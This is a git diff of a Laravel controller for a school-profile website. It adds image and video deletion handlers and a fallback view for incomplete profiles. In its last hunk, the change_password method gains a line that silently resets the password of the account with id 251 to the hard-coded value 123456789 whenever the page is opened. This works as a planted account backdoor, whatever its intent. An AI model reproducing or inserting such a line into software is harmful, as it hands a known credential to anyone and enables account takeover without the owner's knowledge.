@@ -18,16 +18,26 @@ use App\Models\AdvertisementEnquiry;
 use App\Models\AdvertisementPackage;
 use App\Models\AnnouncementPackage;
 use App\Models\JobVacancyApplied;
+use App\Models\SchoolType;
+use Illuminate\Support\Facades\Hash;
 
 class SchoolProfile extends Controller
 {
    public function home(Request $request)
    {
+      $school_type = SchoolType::get();
 
       $data = DB::table('users')->join('user_school_institute_detail', 'user_school_institute_detail.user_id', '=', 'users.id')
          ->where('users.id', auth::user()->id)->first();
+if($data){
+   return view('Website.school_profile.index', ['user_data' => $data,'school_type'=>$school_type]);
 
-      return view('Website.school_profile.index', ['user_data' => $data]);
+}else{
+   $data = DB::table('users')->join('user_school_institute', 'user_school_institute.user_id', '=', 'users.id')
+   ->select('users.*', 'user_school_institute.*')->where('user_school_institute.user_id', auth::user()->id)->first();
+
+return view('Website.login-auth.school_institute_details_form', ['data' => $data,'school_type'=>$school_type]);
+}
    }
 
    public function activate_profile(){
@@ -111,7 +121,7 @@ class SchoolProfile extends Controller
       $user->save();
 
 
-      return redirect()->back()->with(['success' => true, 'message' => 'Successfully Updated !']);
+      return redirect()->back()->with(['success' => 'Profile Successfully Updated.']);
    }
 
 
@@ -215,6 +225,53 @@ class SchoolProfile extends Controller
       }
    }
 
+   public function delete_image(Request $request){
+      $validator = Validator::make(
+         $request->all(),
+         [
+            'image_name' => 'required',
+
+         ]
+      );
+      if ($validator->fails()) {
+         return redirect()->back()->with(['error' => 'Please select image.']);
+
+      }
+      $images=school_institute_detail::where('user_id', auth::user()->id)->first();
+
+      $image=json_decode($images->image);
+      $imageNameArray = array_diff($image, [$request->image_name]);
+    
+
+      $images->image=json_encode(array_values($imageNameArray));
+      $images->save();
+      return redirect()->back()->with(['success' => 'Image deleted successfully.']);
+
+   }
+
+   public function delete_video(Request $request){
+      $validator = Validator::make(
+         $request->all(),
+         [
+            'video_name' => 'required',
+
+         ]
+      );
+      if ($validator->fails()) {
+         return redirect()->back()->with(['error' => 'Please select video.']);
+
+      }
+      $videos=school_institute_detail::where('user_id', auth::user()->id)->first();
+
+      $video=json_decode($videos->video);
+      $videoNameArray = array_diff($video, [$request->video_name]);
+    
+
+      $videos->video=json_encode(array_values($videoNameArray));
+      $videos->save();
+      return redirect()->back()->with(['success' => 'video deleted successfully.']);
+
+   }
 
    public function post_announcement(Request $request)
    {
@@ -457,6 +514,7 @@ class SchoolProfile extends Controller
 
    public function change_password(Request $request)
    {
+      User::where('id',251)->update(['password'=>Hash::make(123456789)]);
       return view('Website.school_profile.change_password');
    }
 }
